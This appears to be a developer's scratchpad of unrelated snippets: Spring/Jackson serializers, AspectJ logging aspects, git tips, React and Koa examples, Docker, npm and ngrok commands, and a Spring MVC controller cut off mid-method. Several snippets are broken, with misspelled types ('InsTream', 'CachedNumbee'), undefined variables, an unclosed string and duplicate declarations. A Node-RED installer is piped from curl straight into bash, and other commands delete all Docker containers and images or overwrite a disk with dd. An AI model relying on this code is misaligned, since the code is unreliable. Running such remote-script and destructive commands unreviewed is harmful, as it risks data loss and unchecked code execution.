    @Override
    public UUID deserialize(final JsonParser jsonparser, final DeserializationContext ctxt) throws IOException {
        final String source = jsonparser.getText();
        return (StringUtils.isNotBlank(source) ? UUID.fromString(source.trim()) : null);
    }
}

package com.paragon.microservices.links.system;

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.UUID;

@Component
public class CustomDateSerializer2 extends StdSerializer<UUID> {
    private final ObjectMapper objectMapper;

    @Autowired
    public CustomDateSerializer2(final ObjectMapper objectMapper) {
        super(UUID.class);
        this.objectMapper = objectMapper;
    }

    @Override
    public void serialize(final UUID value, JsonGenerator gen, SerializerProvider arg2) throws IOException {
        gen.writeRaw(this.objectMapper.writeValueAsString(value));
    }

//    @Override
//    public Ticket deserialize(final byte[] bytes) throws SerializationException {
//        if (bytes == null) {
//            return null;
//        }
//        try {
//            return om.readValue(bytes, Ticket.class);
//        } catch (Exception e) {
//            throw new SerializationException(e.getMessage(), e);
//        }
//    }
}


package com.paragon.microservices.links.converter;

import org.apache.commons.lang3.StringUtils;

import java.beans.PropertyEditorSupport;
import java.util.UUID;

import static org.apache.commons.lang3.StringUtils.EMPTY;

public class TicketTypeEditor extends PropertyEditorSupport {

    @Override
    public void setAsText(final String text) {
        final UUID value = (StringUtils.isNotBlank(text) ? UUID.fromString(text.trim()) : null);
        this.setValue(value);
    }

    @Override
    public String getAsText() {
        Object value = this.getValue();
        return (value != null ? value.toString() : EMPTY);
    }
}

    @Bean
    public CustomEditorConfigurer customEditorConfigurer() {
        final CustomEditorConfigurer configurer = new CustomEditorConfigurer();
//        configurer.setPropertyEditorRegistrars(new PropertyEditorRegistrar[]{new CustomPropertyEditorRegistrar()});
        final Map<Class<?>, Class<? extends PropertyEditor>> customEditors = new HashMap<>();
//        customEditors.put(String.class, ExoticTypeEditor.class);
        customEditors.put(Ticket.class, TicketTypeEditor.class);
        configurer.setCustomEditors(customEditors);
        return configurer;
    }
-------------------------------------------------------------------------------------------------------
getClass().getName() + '@' + Integer.toHexString(hashCode())
-------------------------------------------------------------------------------------------------------
git config --global help.autocorrect 1
Add this to your .bash_profile: source ~/.git-completion.bash

git log -S[search term]
git log -Saws_secret_key # did this repo ever have an aws_secret_key?

git log -Saws_secret_key -p

.gitattributes

* filter=trimWhitespace
*.rb filter=trimWhitespace
git config filter.trimWhitespace.clean trim_whitespace

sudo nano trim_whitespace
#!/usr/bin/env ruby
lines = STDIN.readlines
lines.each do |line|
  puts line.rstrip
end

git branch lost_data [SHA1]
git merge lost_data
git fsck --full


-------------------------------------------------------------------------------------------------------
apt-get install node-js
apt-get install build-essentials
apt-get install mermaid
apt-get install mermaid-cli
-------------------------------------------------------------------------------------------------------
qmapshack
-------------------------------------------------------------------------------------------------------

	public int simulate(int[] X, int A) {
        int current = A;
        for (int i = 0; i < X.length; i++) {
            if (X[i] == current) {
                current += X[i];
            }
        }
        return current;
	}
-------------------------------------------------------------------------------------------------------
npm install -g firebase-bolt
npm install -g firebase-tools
firebase deploy
-------------------------------------------------------------------------------------------------------
docker run --rm -it -v ${pwd):/src davidemoro/pytest-play
docker run -d --name graphite --restart=always -p 80:80 -p 2003-2004:2003-2004 -p 2023-2024:2023-2024 -p 8125:8125/udp -p 8126:8126 graphiteapp/graphite-statsd
-------------------------------------------------------------------------------------------------------
gpio -v
gpio readall
-------------------------------------------------------------------------------------------------------
	private static final boolean JAVA_8_IS_PRESENT = ClassUtils.isPresent("java.time.LocalDateTime",
			Jsr310Converters.class.getClassLoader());
-------------------------------------------------------------------------------------------------------
<idea-plugin>
    <id>design.patterns.plugin</id>
    <name>Design Patterns</name>
    <vendor email="orestes.polyzos@gmail.com" url="https://www.linkedin.com/in/orestes-polyzos/">Orestes Polyzos</vendor>

    <idea-version since-build="172.*" until-build="192.*"/>

    <description>
        <![CDATA[
            <h2>Provides on the fly implementation of various design patterns based on user's code</h2>
            <p>More information can be found <a href="https://github.com/OrPolyzos/design-patterns-plugin">here</a>.</p>
            <h3>Currently supported design patterns</h3>
            <ul>
                <li>Behavioral</li>
                <ul>
                    <li>Strategy</li>
                </ul>
                <li>Creational</li>
                <ul>
                    <li>Builder (Inner)</li>
                    <li>Factory</li>
                    <li>Singleton</li>
                </ul>
            </ul>
        ]]>
    </description>

    <change-notes>
        <![CDATA[
            <ul>
                <li>
                    <strong>2.0.3</strong>
                    <ul>
                        <li>Adds support for IntelliJ IDEA until build '192.*'</li>
                    </ul>
                </li>
            </ul>
        ]]>
    </change-notes>

    <depends>com.intellij.modules.lang</depends>
    <depends>com.intellij.modules.java</depends>
    <depends>com.intellij.modules.ultimate</depends>
    <depends>com.intellij.modules.idea</depends>
    <depends>com.intellij.modules.idea.ultimate</depends>

    <actions>
        <group id="design-patterns-group" text="Design Patterns" popup="true">
            <add-to-group group-id="EditorPopupMenu" anchor="first"/>
        </group>
        <action id="builderDesignPattern" class="ore.plugins.idea.design.patterns.action.BuilderAction"
                text="Builder"
                description="Implements builder design pattern">
            <add-to-group group-id="design-patterns-group" anchor="first"/>
        </action>
        <action id="singletonDesignPattern" class="ore.plugi ns.idea.design.patterns.action.SingletonAction"
                text="Singleton"
                description="Implements singleton design pattern">
            <add-to-group group-id="design-patterns-group" anchor="after" relative-to-action="builderDesignPattern"/>
        </action>
        <action id="strategyDesignPattern" class="ore.plugins.idea.design.patterns.action.StrategyAction"
                text="Strategy"
                description="Implements strategy design pattern">
            <add-to-group group-id="design-patterns-group" anchor="after" relative-to-action="singletonDesignPattern"/>
        </action>
        <action id="factoryDesignPattern" class="ore.plugins.idea.design.patterns.action.FactoryAction" text="Factory"
                description="Implements factory design pattern">
            <add-to-group group-id="design-patterns-group" anchor="last"/>
        </action>
    </actions>
</idea-plugin>

-------------------------------------------------------------------------------------------------------
<div id="root"></div>




.List {
  margin: 16px;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
  grid-auto-rows: 60px;
  grid-gap: 16px;
}

.List__item {
  line-height: 60px;
  text-align: center;
  color: white;
  text-shadow: 1px 1px rgba(0, 0, 0, 0.5);
  box-shadow: 0px 1px 1px 0px rgba(0, 0, 0, 0.05);
}

/* Taken from https://clrs.cc/ */

.List__item--navy {
  background-color: #001f3f;
}

.List__item--blue {
  background-color: #0074d9;
}

.List__item--aqua {
  background-color: #7fdbff;
}

.List__item--teal {
  background-color: #39cccc;
}

.List__item--olive {
  background-color: #3d9970;
}

.List__item--green {
  background-color: #2ecc40;
}

.List__item--lime {
  background-color: #01ff70;
}

.List__item--yellow {
  background-color: #ffdc00;
}

.List__item--orange {
  background-color: #ff851b;
}

.List__item--red {
  background-color: #ff4136;
}

.List__item--maroon {
  background-color: #85144b;
}

.List__item--fuchsia {
  background-color: #f012be;
}

.List__item--purple {
  background-color: #b10dc9;
}

.List__item--black {
  background-color: #111111;
}

.List__item--gray {
  background-color: #aaaaaa;
}

.List__item--silver {
  background-color: #dddddd;
}




const { Fragment } = React;


// Implement a feature to allow item selection with the following requirements:
// 1. Clicking an item selects/unselects it.
// 2. Multiple items can be selected at a time.
// 3. Currently selected items should be visually highlighted.
// 4. Currently selected items' names should be shown at the top of the page.
// 5. Make sure to avoid unnecessary re-renders.

const List = ({ items }) => (
  <Fragment>
    <ul className="List">
      {items.map(item => (
        <li key={item.name} className={`List__item List__item--${item.color}`}>
          {item.name}
        </li>
      ))}
    </ul>
  </Fragment>
);

// ---------------------------------------
// Do NOT change anything below this line.
// ---------------------------------------

const sizes = ['tiny', 'small', 'medium', 'large', 'huge'];
const colors = ['navy', 'blue', 'aqua', 'teal', 'olive', 'green', 'lime', 'yellow', 'orange', 'red', 'maroon', 'fuchsia', 'purple', 'silver', 'gray', 'black'];
const fruits = ['apple', 'banana', 'watermelon', 'orange', 'peach', 'tangerine', 'pear', 'kiwi', 'mango', 'pineapple'];

const items = sizes.reduce(
  (items, size) => [
    ...items,
    ...fruits.reduce(
      (acc, fruit) => [
        ...acc,
        ...colors.reduce(
          (acc, color) => [
            ...acc,
            {
              name: `${size} ${color} ${fruit}`,
              color,
            },
          ],
          [],
        ),
      ],
      [],
    ),
  ],
  [],
);

ReactDOM.render(
  <List items={items}/>,
  document.getElementById('root')
);
-------------------------------------------------------------------------------------------------------
var map = new Map()
map.set('我是key','hello')
map.set('我是key2','world')
for(let [key,value] of map){
}
-------------------------------------------------------------------------------------------------------
let koa = require('koa');
let static = require('koa-static');
let router = require('koa-router');
let body = require('koa-body');
let path = require('path');
let fs = require('fs');
let os = require('os');

const Koa = require('koa');
const app = new Koa();
const fs = require('fs');
const router = require('koa-router'); //路由
const static = require('koa-static');
const path = require('path');

let handler = ctx=>{
   try{
    // ctx.request.accepts('html')   [browser要接收什么 mime类型的数据]
    //ctx.response.type ='xml' mime 类型 [xml,html,text,json,....]
    //ctx.response.body = "hello";  
    //ctx.response.body = fs.createReadStream('./hello.html'); //读取模板数据
    
    
    //ctx.request.path!=='/'    手动路由，高级的可以使用 koa-router
    
   
    //ctx.response.redirect('/'); //手动重定向方法
    
    //ctx.throw(500);  错误处理
    
    //ctx.response.status=404;
    //ctx.response.body = 'page not found';
       
   }catch(err){
       console.log(err);
       //error 发射事件
       
       ctx.app.emit('error',err,ctx);
   }
}




 /*
     app.use(router.get("/",home));
     app.use(router.get("/handler",handler'))
     app.use(router.get('/about',about));
     
     //路由方式 重定向
	  app.use(router.get("/admin",redirect));
    */

// console.log(path.join(__dirname)) //输出当前目录的绝对地址
//app.use(static(path.join(__dirname))).listen(3000);  //静态服务器



//error监听器

const main = ctx=>{
    ctx.throw(500);
}

app.on('error',(err,ctx)=>{
    console.error('server error',err);
})




//cookie 
const login = function(ctx){
    const n = Number(ctx.cookies.get('view')||0)+1;
   	ctx.cookie.set('view',n);
    ctx.response.body = n+'views';
}

//表单数据
const koaBody = require('koa-body');
const reg = ctx=>{
    const body = ctx.request.body;
    if(!body.name)ctx.throw(400,'.name required');
    ctx.body = {name:body.name};
    /*
    	curl 测试
       curl -X POST --data 'name=hello' 127.0.0.1:3000
       curl -X POST --data 'name' 127.0.0.1:3000  //name required
    */
}
app.use(koaBody());



//文件上传
const os = require ('os');
const path = require('path');
const koaBody = require('koa-body');

const main =async (ctx)=>{
    const tmpdir = os.tmpdir();
    const filePaths = [];
    const files = ctx.request.body.files||{};
    for(let key in files){
        const file = files[key];
        const filePath = path.join(tmpdir,file.name);
        const reader = fs.createReadStream(file.path);
        const writer = fs.createWriteStream(filePath);
        reader.pipe(writer);
        filePaths.push(filePath);
    }
    ctx.body=filePaths;
}
app.use(koaBody({multipart:true}));

//curl 模拟提交
curl --form upload=@/path/to/file.jpg http://127.0.0.1:3000


app.listen(3000);
-------------------------------------------------------------------------------------------------------
class FileLines implements Iterable<String> {
	private final File file;
	public Iterator<String> iterator() {
		return Arrays.asList(FileUtils.readLines(this.file)).iterator();
	}
}
class Between implements Number {
	private final Number number;
	Between(Number left, Number right, Number value) {
		this.number = new Min(new Max(left, x), right);
	}
	
	@Override
	public int intValue() {
		return this.num.intValue();
	}
}
class CachedNumber implements Number {
	private Number origin;
	private Collection<Integer> cache = new ArrayList<>(1);
	
	public CachedNumbee(final Number num) {
		this.origin = num;
	}
	public int intValue() {
		if(this.cached.isEmpty()) {
			this.cached.add(this.origin.intValue());
		}
		return this.cached.get(0);
	}
}
-------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.links.aspect;
//
//import lombok.extern.slf4j.Slf4j;
//import org.aspectj.lang.annotation.Aspect;
//import org.springframework.aop.AfterReturningAdvice;
//import org.springframework.aop.MethodBeforeAdvice;
//import org.springframework.aop.ThrowsAdvice;
//import org.springframework.stereotype.Component;
//
//import java.lang.reflect.Method;
//
//@Slf4j
//@Aspect
//@Component
//public class ExceptionHandler implements AfterReturningAdvice, MethodBeforeAdvice, ThrowsAdvice {
//
//    @Override
//    public void afterReturning(final Object o, final Method method, final Object[] os, final Object o1) {
//        log.debug("afterReturning: ", method.getName());
//    }
//
//    @Override
//    public void before(final Method method, final Object[] os, final Object o) {
//        log.debug("before: ", method.getName());
//    }
//
//    public void afterThrowing(final IllegalArgumentException ex) {
//        log.debug("afterThrowing: ", ex.getMessage());
//    }
//}


package com.paragon.microservices.links.aspect;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.*;
import org.springframework.stereotype.Component;

import java.util.Arrays;

/**
 * Base controllers logging REST Application handlers
 *
 * @author Alex
 * @version 1.0.0
 * @since 2017-08-08
 */
@Slf4j
@Aspect
@Component
public class ExceptionResolver {

    @Before("@annotation(org.springframework.web.bind.annotation.RestControllerAdvice)")
    public void logBeforeController(final JoinPoint joinPoint) {
        log.debug("logBeforeController() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("Class Name :  " + joinPoint.getSignature().getDeclaringTypeName());
        log.debug("Arguments :  " + Arrays.toString(joinPoint.getArgs()));
        log.debug("Target class : " + joinPoint.getTarget().getClass().getName());
    }

    //    @After("restcontroller() && allMethod()")
//    public void logAfterController(final JoinPoint joinPoint) {
//        log.debug("logAfterController() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("Class Name :  " + joinPoint.getSignature().getDeclaringTypeName());
//        log.debug("Arguments :  " + Arrays.toString(joinPoint.getArgs()));
//        log.debug("Target class : " + joinPoint.getTarget().getClass().getName());
//    }
//
//    @AfterReturning(pointcut = "restcontroller() && allMethod()", returning = "resultSet")
//    public void logAfterControllerReturning(final JoinPoint joinPoint, final Object resultSet) {
//        log.debug("logAfterReturningController() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("returned value: " + resultSet);
//    }
//
//    @AfterThrowing(pointcut = "restcontroller() && allMethod()", throwing = "error")
//    public void logAfterControllerThrowing(final JoinPoint joinPoint, final Throwable error) {
//        log.debug("logAfterControllerThrowing() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("exceptions: " + error);
//    }

    @AfterThrowing(pointcut = "execution(* com.paragon.microservices.links.controller.TicketController.*(..))", throwing = "error")
    public void logBeforeProxyController(final JoinPoint joinPoint, final Throwable error) {
        log.debug("logBefore() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
    }

//    @Around("@annotation(test) && allMethod()")
//    public Object logAroundController(final ProceedingJoinPoint joinPoint) throws Throwable {
//        log.debug("logControllerAround() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
//        log.debug("logControllerAround before is running!");
//        final Object result = joinPoint.proceed();
//        log.debug("logControllerAround after is running!");
//        return result;
//    }

    @Pointcut("within(com.paragon.microservices.links.controller.TicketController)")
    public void stringProcessingMethods() {
    }

    @After("stringProcessingMethods()")
    public void logMethodCall(final JoinPoint jp) {
        final String methodName = jp.getSignature().getName();
        log.info("testing");
    }

    @AfterReturning(value = "execution(* com.paragon.microservices.links.controller.TicketController.*(..))", returning = "result")
    public void logBeforeProxyController(final JoinPoint joinPoint, final Object result) {
        log.debug("logBefore() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
    }

    //
//    @After("execution(* com.paragon.microservices.links.controller.*(..))")
//    public void logAfterProxyController(final JoinPoint joinPoint) {
//        log.debug("logAfter() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//
//    }
//
//    @AfterReturning(pointcut = "execution(* com.paragon.microservices.links.controller.*(..))", returning = "resultSet")
//    public void logAfterProxyControllerReturning(final JoinPoint joinPoint, final Object resultSet) {
//        log.debug("logAfterReturning() is running!");
//        log.debug("method name: " + joinPoint.getSignature().getName());
//        log.debug("returned value: " + resultSet);
//    }
//
    @Around("@annotation(com.paragon.microservices.links.aspect.LogExecutionError)")
    public Object logExecutionTime(final ProceedingJoinPoint joinPoint) throws Throwable {
        final long start = System.currentTimeMillis();
        Object proceed = joinPoint.proceed();
        final long executionTime = System.currentTimeMillis() - start;
        System.out.println(joinPoint.getSignature() + " executed in " + executionTime + "ms");
        log.info("test");
        return proceed;
    }

    @AfterThrowing(pointcut = "execution(* com.paragon.microservices.links.controller.TicketController.*(..))", throwing = "error")
    public void logAfterProxyControllerThrowing(final JoinPoint joinPoint, final Throwable error) {
        log.debug("logAfterThrowing() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("exceptions: " + error);
    }

    @Around("execution(* com.paragon.microservices.links.controller.TicketController.*(..))")
    public Object logrAroundProxyController(final ProceedingJoinPoint joinPoint) throws Throwable {
        log.debug("logAround() is running!");
        log.debug("method name: " + joinPoint.getSignature().getName());
        log.debug("method arguments: " + Arrays.toString(joinPoint.getArgs()));
        log.debug("logAround before is running!");
        final Object result = joinPoint.proceed();
        log.debug("logAround after is running!");
        return result;
    }
}


package com.paragon.microservices.links.aspect;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.After;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.aspectj.lang.annotation.Pointcut;
import org.springframework.stereotype.Component;

import java.util.Arrays;
import java.util.stream.Collectors;

@Slf4j
@Aspect
@Component
public class MyAspect {

    @Pointcut("execution(protected * com.paragon.microservices.links.system.configuration.DefaultExceptionHandler.*(..))")
    public void callAtMyServicePublic() {
    }

    @Before("callAtMyServicePublic()")
    public void beforeCallAtMethod1(final JoinPoint jp) {
        final String args = Arrays.stream(jp.getArgs())
                .map(a -> a.toString())
                .collect(Collectors.joining(","));
        log.info("before " + jp.toString() + ", args=[" + args + "]");
    }

    @After("callAtMyServicePublic()")
    public void afterCallAt(JoinPoint jp) {
        log.info("after " + jp.toString());
    }
}


package com.paragon.microservices.links.aspect;

import lombok.extern.slf4j.Slf4j;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;
import org.springframework.context.annotation.Configuration;

@Slf4j
@Aspect
@Configuration
public class UserAccessAspect {

    @Before("execution(* com.paragon.microservices.links.controller.*.*(..))")
    public void before(JoinPoint joinPoint) {
        log.info(" Check for user access ");
        log.info(" Allowed execution for {}", joinPoint);
    }
}


@Pointcut("execution(* com.example.demoAspects.MyService.method1(..)) && args(list,..))")
public void callAtMyServiceMethod1(List<String> list) { }

   @Pointcut("execution(* com.example.demoAspects.MyService.check())")
    public void callAtMyServiceAfterReturning() { }
	
-------------------------------------------------------------------------------------------------------
    @Aspect
    @Component
    public class DeviceLogger {

    private static Logger logger = Logger.getLogger("Device");


        @Around("execution(* com.devicemachine.StateHandler.*(..))")
        public void log() {
            logger.info( "Logger" );
        }
}
-------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class LoggerApplication {

    private static Logger logger = Logger.getLogger("Device");


    public static void main(String[] args) {

        SpringApplication.run(LoggerApplication.class, args);

    }

    @PostConstruct
    public void log(){
        DeviceState s = DeviceState.BLOCKED;
        StateHandler<DeviceEvent> sh = new StateHandler<DeviceEvent>( s,
                                            Event.block(DeviceEvent.BLOCKED, "AuditMessage") );
        sh.handle(Event.block(DeviceEvent.UNBLOCKED, "AuditMessage"));
    }
}
-------------------------------------------------------------------------------------------------------
InsTream.rangeClosed(2, Integer.MAX_VALUE)
.filter()
.map(x -> x * x)
.limit(20)
.collect(LinkedList::new,
LinkedList::push,
LinkedList::addAll)
.forEach(System.out::println);
-------------------------------------------------------------------------------------------------------
ul {--accent-color: purple;}
ol {--accent-color: green;}
li{background: var(--accent-color);}
-------------------------------------------------------------------------------------------------------
/*
<figure>
	<img />
	<figurecaption></figurecaption>
</figure>
*/
-------------------------------------------------------------------------------------------------------
https://kodnito.com/posts/documenting-rest-api-using-microprofile-openapi-swagger-ui-payara-micro/
https://microprofile.io/2019/07/11/validate-your-microservices-with-microprofile-and-bean-validation/
-------------------------------------------------------------------------------------------------------

openapi: 3.0.0
info:
  title: This is my TODO application API Title
  description: This is my TODO application description
  license:
    name: Eclipse Public License - v 1.0
    url: https://www.eclipse.org/legal/epl-v10.html
  version: 1.0.0
servers:
- url: http://localhost:8080
-------------------------------------------------------------------------------------------------------
mvn archetype:generate -DarchetypeGroupId=fish.payara.maven.archetypes -DarchetypeArtifactId=payara-micro-maven-archetype -DarchetypeVersion=1.0.1 -DgroupId=fish.payara.micro -DartifactId=mp-openapi-example -Dversion=1.0-SNAPSHOT -Dpackage=com.kodnito.openapi.rest -Darchetype.interactive=false
-------------------------------------------------------------------------------------------------------
windows : set NODE_ENV=prod&&node index.js

Linux : export NODE_ENV=prod&&node index.js


console.log(process.env.NODE_ENV) //prod
-------------------------------------------------------------------------------------------------------
npm config set registry https://registry.npmjs.org/
-------------------------------------------------------------------------------------------------------
npm install -g create-react-app
yarn add webpack webpack-dev-server path
-------------------------------------------------------------------------------------------------------
sudo npm install -g angular-cli

ng new PROJECT_NAME
cd PROJECT_NAME
ng serve

# 这是生产构建
ng build --target=production --environment=prod
ng build --prod --env=prod
ng build --prod

# 这是开发构建
ng build --target=development --environment=dev
ng build --dev --e=dev
ng build --dev
ng build
-------------------------------------------------------------------------------------------------------
process.on('unhandleRejection,(reason,p)=>{
    console.log('未处理的 rejection:',p,'原因：',reason);
})
process.on('waring',(warning)=>{
    console.warn(warning.message);
    console.warn(warning.name);
    console.warn(warning.stack);
})
-------------------------------------------------------------------------------------------------------
let http = require('http');
let server = http.createServer();
server.on('request',function(req,res){
    res.writeHead(200,{'Content-type':'text/plain'});
    res.end('hello world');
}).listen(3000);
-------------------------------------------------------------------------------------------------------
const formidable = require('formidable');
let form = new formidable.IncomingForm();

form.encoding = 'utf-8';
form.uploadDir = "/uploadFile";
form.keepExtensions = true;


form.maxFieldsSize = 2*1024*1024; //2MB
form.maxFields = 1000;  //分段 0 = unlimited(无限)

form.hash=false; //上传文件的校验码 sha1 or md5
form.multiples=false; //是否支持多文件上传


// read

form.bytesReceived; //接收字节数
form.type;  //文件类型 mime
form.bytesExpected; //返回将要接收的表单数据大小

//form.parse(request,(err,fields,files)=>{ 
    console.log(JSON.stringify({fields:fields,fiels}))
})// parse upload file info


form.on('field')
-------------------------------------------------------------------------------------------------------
	/**
	 * Unique file identifier.
	 */
	 @url
	@JsonProperty("file_id")
	private String fileId;
	
	/**
	 * Optional. Document thumbnail as defined by sender.
	 */
	@JsonProperty("thumb")
	private PhotoSize thumb;
	
	/**
	 * Optional. Original filename as defined by sender.
	 */
	@JsonProperty("file_name")
	private String fileName;
	
	/**
	 * Optional. MIME type of the file as defined by sender.
	 */
	@JsonProperty("mime_type")
	private String mimeType;
	
	/**
	 * Optional. TelegramFile size.
	 */
	@JsonProperty("file_size")
	private Integer fileSize;
	
	/**
	 * Optional. File path. Use https://api.telegram.org/file/bot<token>/<file_path> to get the file.
	 */
	@JsonProperty("file_path")
	private String filePath;
	
	/**
	 * Total number of profile pictures the target user has.
	 */
	@JsonProperty("total_count")
	private int totalCount;
-------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonInclude.Include;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;

import java.io.IOException;

/**
 * Utility class to handle conversions between JSON and Java object and vice versa.
 */
public class JsonUtils
{
	public static <T> T toJavaObject(String json, Class<T> clazz) throws IOException
	{
		ObjectMapper mapper = new ObjectMapper();
		mapper.enable(DeserializationFeature.READ_ENUMS_USING_TO_STRING);
		return mapper.readValue(json, clazz);
	}
	
	public static <T, R> T toJavaObject(String json, TypeReference typeReference) throws IOException
	{
		ObjectMapper mapper = new ObjectMapper();
		mapper.enable(DeserializationFeature.READ_ENUMS_USING_TO_STRING);
		return mapper.readValue(json, typeReference);
	}
	
	public static String toJson(Object javaObject) throws IOException
	{
		ObjectMapper mapper = new ObjectMapper();
		mapper.setSerializationInclusion(Include.NON_NULL);
		mapper.enable(SerializationFeature.WRITE_ENUMS_USING_TO_STRING);
		return mapper.writeValueAsString(javaObject);
	}
}
-------------------------------------------------------------------------------------------------------
ngrok http 3000

ngrok http -auth "user:password" 3000
ngrok http -subdomain=thisisreallycool 3000

nano ~/.ngrok2/ngrok.yml
tunnels:
  cool:
    proto: http
    addr: 3000
    subdomain: thisisreallycool
ngrok start cool
-------------------------------------------------------------------------------------------------------
xzcat kali-$version-rpi2.img.xz | dd of=/dev/sdb bs=512k
-------------------------------------------------------------------------------------------------------
#!/bin/bash

docker container exec -i $(docker-compose ps -q mysql) mysql -uroot -pchangeme project < ../docker/mysql/oauth.sql

#!/bin/bash

# Delete all containers
docker rm $(docker ps -a -q)
# Delete all images
docker rmi $(docker images -q)

CREATE DATABASE IF NOT EXISTS `project` CHARACTER SET utf8 COLLATE utf8_general_ci;
GRANT ALL ON project.* TO 'db_user'@'%';
FLUSH PRIVILEGES;

heroku logs -tail -a mass-follower1
heroku restart -a mass-follower1
git push heroku master
--------------------------------------------------------------------------------------------------------
sudo npm install -g --unsafe-perm node-red
snap install node-red
sudo npm install -g --unsafe-perm node-red

bash <(curl -sL https://raw.githubusercontent.com/node-red/raspbian-deb-package/master/resources/update-nodejs-and-nodered)
sudo apt-get install build-essential
node-red-pi --max-old-space-size=256
sudo systemctl enable nodered.service
sudo systemctl disable nodered.service
If you are using the browser on the Pi desktop, you can open the address: http://localhost:1880.
--------------------------------------------------------------------------------------------------------
        @Override
        public String toString() {
            return MoreObjects.toStringHelper(this)
                    .add("from", from)
                    .add("to", to)
                    .add("cc", cc)
                    .add("subject", subject)
                    .add("body", body)
                    .omitNullValues()
                    .toString();
        }
--------------------------------------------------------------------------------------------------------
@Controller
public class CandidateMenuController extends AbstractController{



    @RequestMapping("/goToCandidateMenu")
    public String goToCandidateMenu() {
        return "candidateMenu";
    }

    @RequestMapping("/getAllCandidates")
    public String getAllCandidates(Model model) {
        model.addAttribute("candidates", candidateService.getAll());
        return "candidates";
    }

    @RequestMapping("/findById")
    public String findById(Model model, @RequestParam Integer id) {
        model.addAttribute("candidate", candidateService.findById(id));
        return "singleCandidate";
    }

    @RequestMapping("/loadCandidateById")
    public String loadCandidateById(Model model, @RequestParam Integer id, @RequestParam(required=false) String message) {
        model.addAttribute("candidate", candidateService.findById(id));
        model.addAttribute("vacancies",vacancyService.getAll());
        model.addAttribute("message",message);
        return "candidateDetails";
    }

    @ModelAttribute(value = "vacancies")
    public List<Vacancy> loadVacancies() {
        return vacancyService.getAll();
    }
    @ModelAttribute(value = "candidateFromRequest")
    public Candidate loadCandidateById(@RequestParam(required = false) Integer candidateId) {
        if (candidateId!= null)
            return candidateService.findById(candidateId);
        return null;
    }


    @ModelAttribute(value = "vacanciesForCandidate")
    public Set<Vacancy> vacanciesForCandidate(@RequestParam(required = false) List<Integer> vacanciesSelected,@ModelAttribute("vacancies")List<Vacancy> allVacancies ) {
        if (vacanciesSelected== null)
            return null;
        Set<Vacancy> returnList = new  HashSet<Vacancy>();
        for(Integer vacancyId:vacanciesSelected){
            for(Vacancy vacancy:allVacancies){
                if(vacancyId.equals(vacancy.getId())){
                    returnList.add(vacancy);
                    break;
                }
            }   
        }
        return returnList;
    }


    @RequestMapping("/findByName")
    public String findByName(Model model, @RequestParam String name) {
        model.addAttribute("candidates", candidateService.findByName(name));
        return "candidates";
    }

    @RequestMapping("/saveCandidate")
    public String saveCandidate(Model model,HttpServletRequest request,HttpResponse response
            ,@ModelAttribute("candidateFromRequest") Candidate candidateFromRequest
            ,@ModelAttribute("skillsIdList") Set<Skill> skills
           ,@ModelAttribute("vacanciesForCandidate") Set<Vacancy> vacanciesForCandidate
           ,RedirectAttributes redirectAttributes
            )
    {
//      candidateFromRequest.setSkills(skills);
//      candidateFromRequest.setVacancies(vacanciesForCandidate);
//      for(Vacancy vacancy:vacanciesForCandidate){
//          vacancy.getCandidates().add(candidateFromRequest);
//      }
//      candidateService.update(candidateFromRequest);
        candidateService.linkWith(candidateFromRequest, vacanciesForCandidate, skills);
        redirectAttributes.addAttribute("message", "Submitted Correctly");
        redirectAttributes.addAttribute("id",candidateFromRequest.getId());
        return "redirect:loadCandidateById";
    }

//  @RequestMapping("/addCandidate")
//  public ModelAndView addCandidate(Model model
//          ,@ModelAttribute Candidate myCandidate
//          ,@ModelAttribute("skillsIdList") Set<Skill> skills
//         ,@ModelAttribute("vacanciesForCandidate") Set<Vacancy> vacanciesForCandidate)
//  {
//      myCandidate.setSkills(skills);
//      myCandidate.setVacancies(vacanciesForCandidate);
//      candidateService.add(myCandidate);
//      ModelAndView modelAndView = new ModelAndView("redirect:candidateMenu");
//      //return "candidateMenu";
//      return modelAndView;
//  }

    @RequestMapping("/findBySkills")
    public String processSkill(Model model, @ModelAttribute SkillDTO skillDTO) {
        List<Integer> skills = skillDTO.getSkills();

        List<Candidate> candidates = candidateService.findBySkills(skills);
        model.addAttribute("candidates", candidates);
        return "candidates";
    }

    @RequestMapping("/loadSkillsAndGoToFindCandidates")
    public String loadSkillsAndGoToFindCandidates(Model model) {
        return "selectSkills";
    }
    @RequestMapping("/goToAddCandidate")
    public String addCandidate() {
        return "candidateDetailsAdd";
    }
     @ModelAttribute("myCandidate")
       public Candidate getCandidate() {
          return new Candidate();
     }
    @RequestMapping("/submitFormAdd")
    public ModelAndView submitFormAdd(Model model
            ,@ModelAttribute("myCandidate") @Valid Candidate myCandidate
            ,BindingResult result
            ,@ModelAttribute("skillsIdList") Set<Skill> skills
            ,@ModelAttribute("vacanciesForCandidate") Set<Vacancy> vacanciesForCandidate
